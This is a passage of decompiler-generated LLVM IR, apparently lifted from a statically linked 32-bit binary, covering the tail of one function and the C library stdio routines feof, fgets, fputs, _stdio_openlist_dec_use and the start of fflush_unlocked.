  br i1 %v9_804f1eb, label %dec_label_pc_804f223, label %dec_label_pc_804f1f0

dec_label_pc_804f1f0:                             ; preds = %dec_label_pc_804f1da
  %v9_804f1f0 = icmp eq i32 %v6_804f1e7, 8
  br i1 %v9_804f1f0, label %dec_label_pc_804f213, label %dec_label_pc_804f1f5

dec_label_pc_804f1f5:                             ; preds = %dec_label_pc_804f1f0
  %v12_804f1f5 = icmp eq i32 %v6_804f1e7, %v6_804f1e3
  br i1 %v12_804f1f5, label %dec_label_pc_804f213, label %dec_label_pc_804f1f9

dec_label_pc_804f1f9:                             ; preds = %dec_label_pc_804f1f5
  %v1_804f1f9 = call i32 @_promoted_size(i32 %v1_804f1da)
  store i32 %v1_804f1f9, i32* %ebx.global-to-local, align 4
  %v0_804f200 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804f200, i32* @eax, align 4
  %v1_804f202 = call i32 @_promoted_size(i32 %v1_804f1da)
  %v2_804f207 = sub i32 %v1_804f1f9, %v1_804f202
  %v8_804f207 = xor i32 %v1_804f1f9, %v1_804f202
  %v9_804f207 = xor i32 %v2_804f207, %v1_804f1f9
  %v10_804f207 = and i32 %v9_804f207, %v8_804f207
  %v11_804f207 = icmp slt i32 %v10_804f207, 0
  %v12_804f207 = icmp eq i32 %v2_804f207, 0
  %v13_804f207 = icmp slt i32 %v2_804f207, 0
  %v3_804f209 = icmp ne i1 %v13_804f207, %v11_804f207
  %v4_804f209 = or i1 %v12_804f207, %v3_804f209
  %v5_804f209 = zext i1 %v4_804f209 to i32
  store i32 %v5_804f209, i32* %eax.global-to-local, align 4
  %v1_804f20f = icmp eq i1 %v4_804f209, false
  br i1 %v1_804f20f, label %dec_label_pc_804f223, label %dec_label_pc_804f1f9.dec_label_pc_804f213_crit_edge

dec_label_pc_804f1f9.dec_label_pc_804f213_crit_edge: ; preds = %dec_label_pc_804f1f9
  %v0_804f213.pre = load i32, i32* @esp, align 4
  %v1_804f213.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f213

dec_label_pc_804f213:                             ; preds = %dec_label_pc_804f1f9.dec_label_pc_804f213_crit_edge, %dec_label_pc_804f1f5, %dec_label_pc_804f1f0
  %v1_804f213 = phi i32 [ %v1_804f213.pre, %dec_label_pc_804f1f9.dec_label_pc_804f213_crit_edge ], [ %v1_804f1e3, %dec_label_pc_804f1f5 ], [ %v1_804f1e3, %dec_label_pc_804f1f0 ]
  %v0_804f213 = phi i32 [ %v0_804f213.pre, %dec_label_pc_804f1f9.dec_label_pc_804f213_crit_edge ], [ %v0_804f1e3, %dec_label_pc_804f1f5 ], [ %v0_804f1e3, %dec_label_pc_804f1f0 ]
  %v2_804f213 = mul i32 %v1_804f213, 4
  %v3_804f213 = add i32 %v0_804f213, 80
  %v4_804f213 = add i32 %v3_804f213, %v2_804f213
  %v5_804f213 = inttoptr i32 %v4_804f213 to i32*
  %v6_804f213 = load i32, i32* %v5_804f213, align 4
  store i32 %v6_804f213, i32* %eax.global-to-local, align 4
  store i32 %v1_804f1da, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  store i32 %v6_804f213, i32* %v5_804f1e7, align 4
  br label %dec_label_pc_804f223

dec_label_pc_804f223:                             ; preds = %dec_label_pc_804f1f9, %dec_label_pc_804f1da, %dec_label_pc_804f213
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804f227 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f227 = add i32 %v0_804f227, 1
  store i32 %v1_804f227, i32* %ebp.global-to-local, align 4
  %v3_804f228 = load i32, i32* %v2_804f228, align 4
  %v1_804f22b = add i32 %v3_804f228, 2
  store i32 %v1_804f22b, i32* %eax.global-to-local, align 4
  %v5_804f230 = icmp slt i32 %v1_804f227, %v1_804f22b
  br i1 %v5_804f230, label %dec_label_pc_804f1a8, label %dec_label_pc_804f25e

dec_label_pc_804f237:                             ; preds = %dec_label_pc_804f19b
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804f23b = add i32 %tmp76, 38
  %v2_804f23b = inttoptr i32 %v1_804f23b to i8*
  store i8 1, i8* %v2_804f23b, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804f244 = add i32 %tmp76, 28
  %v2_804f244 = inttoptr i32 %v1_804f244 to i32*
  %v3_804f244 = load i32, i32* %v2_804f244, align 4
  %v2_804f247 = mul i32 %v3_804f244, 4
  %v2_804f24b = ptrtoint i32* %stack_var_-20 to i32
  %v1_804f252 = add i32 %tmp76, 40
  store i32 %v1_804f252, i32* %eax.global-to-local, align 4
  %v3_804f256 = inttoptr i32 %v1_804f252 to i16*
  %v4_804f256 = call i32 @memcpy(i16* %v3_804f256, i32 %v2_804f24b, i32 %v2_804f247)
  store i32 %v4_804f256, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f25e

dec_label_pc_804f25e:                             ; preds = %dec_label_pc_804f223, %dec_label_pc_804f237
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804f237 ], [ %stack_var_-88.5, %dec_label_pc_804f223 ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  %v2_804f266 = inttoptr i32 %v1_804ef07 to i8*
  %v3_804f266 = load i8, i8* %v2_804f266, align 1
  %v5_804f266 = icmp slt i8 %v3_804f266, 0
  store i32 %stack_var_-88.6, i32* %v2_804ef00, align 4
  br i1 %v5_804f266, label %dec_label_pc_804f276, label %dec_label_pc_804f26f

dec_label_pc_804f26f:                             ; preds = %dec_label_pc_804f25e
  %v0_804f26f = load i32, i32* @esi, align 4
  %v1_804f26f = add i32 %v0_804f26f, 1
  store i32 %v1_804f26f, i32* %eax.global-to-local, align 4
  %v1_804f272 = load i32, i32* @ecx, align 4
  %v2_804f272 = inttoptr i32 %v1_804f272 to i32*
  store i32 %v1_804f26f, i32* %v2_804f272, align 4
  br label %dec_label_pc_804f289

dec_label_pc_804f276:                             ; preds = %dec_label_pc_804f25e
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %v4_804eed4, i32* %edx.global-to-local, align 4
  %v0_804f27e = load i32, i32* @esi, align 4
  %v2_804f27e = sub i32 %v0_804f27e, %v4_804eed4
  store i32 %v2_804f27e, i32* %esi.global-to-local, align 4
  %v1_804f280 = mul i32 %v2_804f27e, 4
  %v2_804f280 = add i32 %v1_804f280, 224
  store i32 %v2_804f280, i32* %eax.global-to-local, align 4
  %v2_804f287 = load i32, i32* %arg1, align 4
  %v4_804f287 = add i32 %v2_804f287, %v2_804f280
  store i32 %v4_804f287, i32* %arg1, align 4
  br label %dec_label_pc_804f289

dec_label_pc_804f289:                             ; preds = %dec_label_pc_804f26f, %dec_label_pc_804f276
  store i32 %tmp76, i32* @edx, align 4
  %v1_804f28d = add i32 %tmp76, 28
  %v2_804f28d = inttoptr i32 %v1_804f28d to i32*
  %v3_804f28d = load i32, i32* %v2_804f28d, align 4
  store i32 %v3_804f28d, i32* %eax.global-to-local, align 4
  %v1_804f290 = add i32 %v3_804f28d, 2
  br label %dec_label_pc_804f298

dec_label_pc_804f295:                             ; preds = %dec_label_pc_804ef25, %dec_label_pc_804efbf, %dec_label_pc_804eff2, %dec_label_pc_804f06d, %dec_label_pc_804f059, %dec_label_pc_804f050, %dec_label_pc_804f1cd, %dec_label_pc_804f184, %dec_label_pc_804f0cf
  br label %dec_label_pc_804f298

dec_label_pc_804f298:                             ; preds = %dec_label_pc_804f289, %dec_label_pc_804f295
  %storemerge6 = phi i32 [ %v1_804f290, %dec_label_pc_804f289 ], [ -1, %dec_label_pc_804f295 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804f29b = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f29b, i32* @ebx, align 4
  store i32 %v0_804eed3, i32* @esi, align 4
  store i32 %v0_804eed2, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %v1_804f227, { 0, 2, 1 }
  uselistorder i32 %v2_804f207, { 1, 2, 0 }
  uselistorder i32 %v1_804f1f9, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804f1da, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804f1cd, { 1, 0 }
  uselistorder i32 %v5_804f1c7, { 1, 2, 0 }
  uselistorder i32 %v0_804f1da, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_804f1a8, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_804f1be, { 0, 2, 3, 1, 5, 4 }
  uselistorder i32 %v1_804f139, { 1, 2, 0 }
  uselistorder i32 %v1_804f10f, { 1, 2, 0 }
  uselistorder i32 %v0_804f139, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804f0d5, { 1, 0 }
  uselistorder i32 %v1_804f0c2, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_804f0cb, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_804f0b5, { 0, 2, 3, 1 }
  uselistorder i32 %v6_804f0ab, { 1, 0 }
  uselistorder i32 %v1_804f08d, { 1, 0 }
  uselistorder i32 %v0_804f0ab.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_804f070, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804f067, { 1, 2, 0 }
  uselistorder i32 %v0_804f02d, { 1, 0 }
  uselistorder i32 %v1_804f01f, { 1, 0 }
  uselistorder i32 %v1_804f01a, { 0, 1, 3, 2 }
  uselistorder i32 %v6_804f018, { 2, 0, 1 }
  uselistorder i32 %v0_804f03a, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_804efd5, { 1, 2, 0 }
  uselistorder i32 %v0_804efad, { 1, 2, 3, 6, 0, 4, 5, 7 }
  uselistorder i32 %v2_804efa3, { 1, 2, 0 }
  uselistorder i32 %v6_804efa1, { 0, 2, 1 }
  uselistorder i32 %v0_804efa0, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v1_804ef99, { 1, 2, 3, 9, 7, 4, 5, 8, 6, 11, 12, 10, 0, 13 }
  uselistorder i32 %v3_804ef99, { 2, 1, 0 }
  uselistorder i32 %v1_804ef91, { 1, 0 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v8_804ef77, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804ef4d, { 0, 2, 1 }
  uselistorder i32 %v0_804ef3a, { 2, 0, 1 }
  uselistorder i32 %v4_804eed4, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 0, 20, 19, 18, 17, 16, 14, 13, 12, 1, 3, 15, 2, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 5, 4, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 35, 31, 30, 32, 33, 36, 34, 42, 37, 38, 39, 40, 41, 43, 44 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -9, { 1, 0 }
  uselistorder i32 -5, { 4, 1, 2, 3, 0 }
  uselistorder i32 -134574987, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_8057395.172 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804f298, { 1, 0 }
  uselistorder label %dec_label_pc_804f295, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_804f289, { 1, 0 }
  uselistorder label %dec_label_pc_804f25e, { 1, 0 }
  uselistorder label %dec_label_pc_804f223, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f1c7, { 1, 0 }
  uselistorder label %dec_label_pc_804f19b, { 1, 0 }
  uselistorder label %dec_label_pc_804f103, { 1, 0 }
  uselistorder label %dec_label_pc_804f0cf, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f0a6, { 1, 0 }
  uselistorder label %dec_label_pc_804f07d, { 1, 0 }
  uselistorder label %dec_label_pc_804f044, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804efe7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804efa1, { 1, 0 }
  uselistorder label %dec_label_pc_804efa0, { 1, 0 }
  uselistorder label %dec_label_pc_804ef87, { 1, 0 }
  uselistorder label %dec_label_pc_804ef70, { 1, 0 }
  uselistorder label %dec_label_pc_804ef70.outer, { 2, 0, 1 }
}

define i32 @feof(i16* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v12_804f2a3 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804f2a6 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f2a6, i32* %esi.global-to-local, align 4
  %v1_804f2aa = add i32 %v4_804f2a6, 52
  %v2_804f2aa = inttoptr i32 %v1_804f2aa to i32*
  %v3_804f2aa = load i32, i32* %v2_804f2aa, align 4
  %v1_804f2ad = icmp eq i32 %v3_804f2aa, 0
  %v1_804f2af = icmp eq i1 %v1_804f2ad, false
  br i1 %v1_804f2af, label %dec_label_pc_804f2d0, label %dec_label_pc_804f2b1

dec_label_pc_804f2b1:                             ; preds = %entry
  %v1_804f2b1 = add i32 %v4_804f2a6, 56
  store i32 %v1_804f2b1, i32* %ebx.global-to-local, align 4
  store i32 %v12_804f2a3, i32* @eax, align 4
  %v2_804f2c0 = call i32 @__pthread_return_void(i32 %v12_804f2a3, i32 134552291)
  %v1_804f2c8 = call i32 @__pthread_return_0(i32 %v1_804f2b1)
  %v0_804f2d2.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f2d0

dec_label_pc_804f2d0:                             ; preds = %entry, %dec_label_pc_804f2b1
  %v0_804f2d2 = phi i32 [ %v4_804f2a6, %entry ], [ %v0_804f2d2.pre, %dec_label_pc_804f2b1 ]
  %v1_804f2d2 = inttoptr i32 %v0_804f2d2 to i16*
  %v2_804f2d2 = load i16, i16* %v1_804f2d2, align 2
  %v3_804f2d2 = zext i16 %v2_804f2d2 to i32
  store i32 %v3_804f2d2, i32* %ebx.global-to-local, align 4
  br i1 %v1_804f2af, label %dec_label_pc_804f2e8, label %dec_label_pc_804f2d7

dec_label_pc_804f2d7:                             ; preds = %dec_label_pc_804f2d0
  store i32 %v12_804f2a3, i32* @eax, align 4
  %v2_804f2e0 = call i32 @__pthread_return_void(i32 %v12_804f2a3, i32 1)
  %v0_804f2eb.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f2e8

dec_label_pc_804f2e8:                             ; preds = %dec_label_pc_804f2d0, %dec_label_pc_804f2d7
  %v0_804f2eb = phi i32 [ %v3_804f2d2, %dec_label_pc_804f2d0 ], [ %v0_804f2eb.pre, %dec_label_pc_804f2d7 ]
  %v1_804f2eb = and i32 %v0_804f2eb, 4
  ret i32 %v1_804f2eb

; uselistorder directives
  uselistorder i32 %v12_804f2a3, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_804f2e8, { 1, 0 }
  uselistorder label %dec_label_pc_804f2d0, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804f2f4 = load i32, i32* @edi, align 4
  %v0_804f2f5 = load i32, i32* @esi, align 4
  %v0_804f2f6 = load i32, i32* @ebx, align 4
  %v12_804f2f7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_804f2fe = add i32 %arg3, 52
  %v2_804f2fe = inttoptr i32 %v1_804f2fe to i32*
  %v3_804f2fe = load i32, i32* %v2_804f2fe, align 4
  store i32 %v3_804f2fe, i32* @edi, align 4
  %v1_804f301 = icmp eq i32 %v3_804f2fe, 0
  %v1_804f303 = icmp eq i1 %v1_804f301, false
  br i1 %v1_804f303, label %entry.dec_label_pc_804f324_crit_edge, label %dec_label_pc_804f305

entry.dec_label_pc_804f324_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804f324

dec_label_pc_804f305:                             ; preds = %entry
  %v1_804f305 = add i32 %arg3, 56
  store i32 %v1_804f305, i32* @ebx, align 4
  store i32 %v12_804f2f7, i32* @eax, align 4
  %v2_804f314 = call i32 @__pthread_return_void(i32 %v12_804f2f7, i32 134552291)
  %v0_804f319 = load i32, i32* @ebx, align 4
  %v1_804f31c = call i32 @__pthread_return_0(i32 %v0_804f319)
  %v0_804f325.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f324

dec_label_pc_804f324:                             ; preds = %entry.dec_label_pc_804f324_crit_edge, %dec_label_pc_804f305
  %v0_804f325 = phi i32 [ %arg3, %entry.dec_label_pc_804f324_crit_edge ], [ %v0_804f325.pre, %dec_label_pc_804f305 ]
  %v0_804f324 = load i32, i32* @edx, align 4
  %v4_804f32e = inttoptr i32 %arg1 to i8*
  %v5_804f32e = call i32 @__GI_fgets_unlocked(i8* %v4_804f32e, i32 %arg2, i32 %v0_804f325, i32 %v0_804f324)
  store i32 %v5_804f32e, i32* %ebx.global-to-local, align 4
  br i1 %v1_804f303, label %dec_label_pc_804f34d, label %dec_label_pc_804f33c

dec_label_pc_804f33c:                             ; preds = %dec_label_pc_804f324
  store i32 %v12_804f2f7, i32* @eax, align 4
  %v2_804f345 = call i32 @__pthread_return_void(i32 %v12_804f2f7, i32 1)
  %v0_804f350.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f34d

dec_label_pc_804f34d:                             ; preds = %dec_label_pc_804f324, %dec_label_pc_804f33c
  %v0_804f350 = phi i32 [ %v5_804f32e, %dec_label_pc_804f324 ], [ %v0_804f350.pre, %dec_label_pc_804f33c ]
  store i32 %v0_804f2f6, i32* @ebx, align 4
  store i32 %v0_804f2f5, i32* @esi, align 4
  store i32 %v0_804f2f4, i32* @edi, align 4
  ret i32 %v0_804f350

; uselistorder directives
  uselistorder i32 %v12_804f2f7, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804f34d, { 1, 0 }
  uselistorder label %dec_label_pc_804f324, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804f358 = load i32, i32* @edi, align 4
  %v0_804f359 = load i32, i32* @esi, align 4
  %v0_804f35a = load i32, i32* @ebx, align 4
  %v12_804f35b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v1_804f362 = add i32 %arg2, 52
  %v2_804f362 = inttoptr i32 %v1_804f362 to i32*
  %v3_804f362 = load i32, i32* %v2_804f362, align 4
  store i32 %v3_804f362, i32* @edi, align 4
  %v1_804f365 = icmp eq i32 %v3_804f362, 0
  %v1_804f367 = icmp eq i1 %v1_804f365, false
  br i1 %v1_804f367, label %entry.dec_label_pc_804f388_crit_edge, label %dec_label_pc_804f369

entry.dec_label_pc_804f388_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804f388

dec_label_pc_804f369:                             ; preds = %entry
  %v1_804f369 = add i32 %arg2, 56
  store i32 %v1_804f369, i32* @ebx, align 4
  store i32 %v12_804f35b, i32* @eax, align 4
  %v2_804f378 = call i32 @__pthread_return_void(i32 %v12_804f35b, i32 134552291)
  %v0_804f37d = load i32, i32* @ebx, align 4
  %v1_804f380 = call i32 @__pthread_return_0(i32 %v0_804f37d)
  %v0_804f38a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f388

dec_label_pc_804f388:                             ; preds = %entry.dec_label_pc_804f388_crit_edge, %dec_label_pc_804f369
  %v0_804f38a = phi i32 [ %arg2, %entry.dec_label_pc_804f388_crit_edge ], [ %v0_804f38a.pre, %dec_label_pc_804f369 ]
  %v0_804f388 = load i32, i32* @edx, align 4
  %v4_804f38f = inttoptr i32 %arg1 to i8*
  %v5_804f38f = call i32 @__GI_fputs_unlocked(i8* %v4_804f38f, i32 %v0_804f38a, i32 %v0_804f388, i32 %v0_804f388)
  store i32 %v5_804f38f, i32* %ebx.global-to-local, align 4
  br i1 %v1_804f367, label %dec_label_pc_804f3ae, label %dec_label_pc_804f39d

dec_label_pc_804f39d:                             ; preds = %dec_label_pc_804f388
  store i32 %v12_804f35b, i32* @eax, align 4
  %v2_804f3a6 = call i32 @__pthread_return_void(i32 %v12_804f35b, i32 1)
  %v0_804f3b1.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f3ae

dec_label_pc_804f3ae:                             ; preds = %dec_label_pc_804f388, %dec_label_pc_804f39d
  %v0_804f3b1 = phi i32 [ %v5_804f38f, %dec_label_pc_804f388 ], [ %v0_804f3b1.pre, %dec_label_pc_804f39d ]
  store i32 %v0_804f35a, i32* @ebx, align 4
  store i32 %v0_804f359, i32* @esi, align 4
  store i32 %v0_804f358, i32* @edi, align 4
  ret i32 %v0_804f3b1

; uselistorder directives
  uselistorder i32 %v12_804f35b, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804f3ae, { 1, 0 }
  uselistorder label %dec_label_pc_804f388, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_804f3c7 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804f3c7, i32* @eax, align 4
  %v2_804f3cc = call i32 @__pthread_return_void(i32 %v2_804f3c7, i32 134552291)
  %v1_804f3d8 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a474.158 to i32))
  %v0_804f3dd = load i32, i32* @global_var_805e704.159, align 4
  %v8_804f3e5 = icmp eq i32 %v0_804f3dd, 1
  %v1_804f3e6 = icmp eq i1 %v8_804f3e5, false
  br i1 %v1_804f3e6, label %dec_label_pc_804f47d, label %dec_label_pc_804f3ec

dec_label_pc_804f3ec:                             ; preds = %entry
  %v0_804f3ec = load i32, i32* @global_var_805e708.160, align 8
  %tmp29 = icmp slt i32 %v0_804f3ec, 1
  br i1 %tmp29, label %dec_label_pc_804f47d, label %dec_label_pc_804f3f9

dec_label_pc_804f3f9:                             ; preds = %dec_label_pc_804f3ec
  store i32 0, i32* @esi, align 4
  %v2_804f406 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_804f406, i32* @eax, align 4
  %v2_804f40b = call i32 @__pthread_return_void(i32 %v2_804f406, i32 134552291)
  %v1_804f417 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a45c.162 to i32))
  %v0_804f41c = load i32, i32* bitcast (i32** @global_var_805a458.163 to i32*), align 8
  store i32 %v0_804f41c, i32* %edx.global-to-local, align 4
  %v1_804f45e3 = icmp eq i32 %v0_804f41c, 0
  %v1_804f46010 = icmp eq i1 %v1_804f45e3, false
  br i1 %v1_804f46010, label %dec_label_pc_804f427, label %dec_label_pc_804f462

dec_label_pc_804f427:                             ; preds = %dec_label_pc_804f3f9, %dec_label_pc_804f45c
  %v1_804f42714.in = phi i32 [ %v0_804f45c, %dec_label_pc_804f45c ], [ %v0_804f41c, %dec_label_pc_804f3f9 ]
  %v1_804f42714 = inttoptr i32 %v1_804f42714.in to i16*
  %v2_804f427 = load i16, i16* %v1_804f42714, align 2
  %v1_804f42a = add i32 %v1_804f42714.in, 32
  %v2_804f42a = inttoptr i32 %v1_804f42a to i32*
  %v3_804f42a = load i32, i32* %v2_804f42a, align 4
  store i32 %v3_804f42a, i32* @ebx, align 4
  %v1_804f42d = and i16 %v2_804f427, -32720
  %v6_804f432 = icmp eq i16 %v1_804f42d, 48
  br i1 %v6_804f432, label %dec_label_pc_804f43b, label %dec_label_pc_804f437

dec_label_pc_804f437:                             ; preds = %dec_label_pc_804f427
  store i32 %v1_804f42714.in, i32* @esi, align 4
  br label %dec_label_pc_804f45c

dec_label_pc_804f43b:                             ; preds = %dec_label_pc_804f427
  %v0_804f43b = load i32, i32* @esi, align 4
  %v1_804f43b = icmp eq i32 %v0_804f43b, 0
  %v1_804f43d = icmp eq i1 %v1_804f43b, false
  br i1 %v1_804f43d, label %dec_label_pc_804f447, label %dec_label_pc_804f43f

dec_label_pc_804f43f:                             ; preds = %dec_label_pc_804f43b
  store i32 %v3_804f42a, i32* bitcast (i32** @global_var_805a458.163 to i32*), align 8
  br label %dec_label_pc_804f44a

dec_label_pc_804f447:                             ; preds = %dec_label_pc_804f43b
  %v2_804f447 = add i32 %v0_804f43b, 32
  %v3_804f447 = inttoptr i32 %v2_804f447 to i32*
  store i32 %v3_804f42a, i32* %v3_804f447, align 4
  %v0_804f44a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f44a

dec_label_pc_804f44a:                             ; preds = %dec_label_pc_804f43f, %dec_label_pc_804f447
  %v0_804f453 = phi i32 [ %v1_804f42714.in, %dec_label_pc_804f43f ], [ %v0_804f44a.pre, %dec_label_pc_804f447 ]
  %v1_804f44a = add i32 %v0_804f453, 1
  %v2_804f44a = inttoptr i32 %v1_804f44a to i8*
  %v3_804f44a = load i8, i8* %v2_804f44a, align 1
  %v4_804f44a = and i8 %v3_804f44a, 32
  %v5_804f44a = icmp eq i8 %v4_804f44a, 0
  br i1 %v5_804f44a, label %dec_label_pc_804f45c, label %dec_label_pc_804f450

dec_label_pc_804f450:                             ; preds = %dec_label_pc_804f44a
  %v1_804f454 = call i32 @free(i32 %v0_804f453)
  br label %dec_label_pc_804f45c

dec_label_pc_804f45c:                             ; preds = %dec_label_pc_804f44a, %dec_label_pc_804f437, %dec_label_pc_804f450
  %v0_804f45c = load i32, i32* @ebx, align 4
  store i32 %v0_804f45c, i32* %edx.global-to-local, align 4
  %v1_804f45e = icmp eq i32 %v0_804f45c, 0
  %v1_804f460 = icmp eq i1 %v1_804f45e, false
  br i1 %v1_804f460, label %dec_label_pc_804f427, label %dec_label_pc_804f462

dec_label_pc_804f462:                             ; preds = %dec_label_pc_804f45c, %dec_label_pc_804f3f9
  store i32 %v2_804f406, i32* @eax, align 4
  %v2_804f46b = call i32 @__pthread_return_void(i32 %v2_804f406, i32 1)
  store i32 0, i32* @global_var_805e708.160, align 8
  %v0_804f47d.pre = load i32, i32* @global_var_805e704.159, align 4
  br label %dec_label_pc_804f47d

dec_label_pc_804f47d:                             ; preds = %dec_label_pc_804f3ec, %entry, %dec_label_pc_804f462
  %v0_804f47d = phi i32 [ %v0_804f3dd, %dec_label_pc_804f3ec ], [ %v0_804f3dd, %entry ], [ %v0_804f47d.pre, %dec_label_pc_804f462 ]
  %v1_804f482 = add i32 %v0_804f47d, -1
  store i32 %v1_804f482, i32* @global_var_805e704.159, align 4
  store i32 %v2_804f3c7, i32* @eax, align 4
  %v2_804f491 = call i32 @__pthread_return_void(i32 %v2_804f3c7, i32 1)
  ret i32 %v2_804f491

; uselistorder directives
  uselistorder i32 %v0_804f45c, { 1, 2, 0 }
  uselistorder i32 %v1_804f42714.in, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804f3dd, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f47d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f45c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f44a, { 1, 0 }
  uselistorder label %dec_label_pc_804f427, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_804f49c = load i32, i32* @ebp, align 4
  store i32 0, i32* @ebp, align 4
  %v0_804f49f = load i32, i32* @edi, align 4
  %v0_804f4a0 = load i32, i32* @esi, align 4
  %v0_804f4a1 = load i32, i32* @ebx, align 4
  %v4_804f4a5 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f4a5, i32* @ebx, align 4
  %v10_804f4a9 = icmp eq i16* %arg1, inttoptr (i32 134587480 to i16*)
  br i1 %v10_804f4a9, label %dec_label_pc_804f4bd, label %dec_label_pc_804f4b1

dec_label_pc_804f4b1:                             ; preds = %entry
  %v2_804f4b1 = icmp eq i16* %arg1, null
  store i32 256, i32* @ebp, align 4
  %v1_804f4b7 = icmp eq i1 %v2_804f4b1, false
  br i1 %v1_804f4b7, label %dec_label_pc_804f5b5, label %dec_label_pc_804f4bd

dec_label_pc_804f4bd:                             ; preds = %dec_label_pc_804f4b1, %entry
  store i32 0, i32* @edi, align 4
  %v2_804f4ca = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804f4ca, i32* @ebx, align 4
  %v2_804f4cf = call i32 @__pthread_return_void(i32 %v2_804f4ca, i32 134552291)
  %v1_804f4db = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a474.158 to i32))
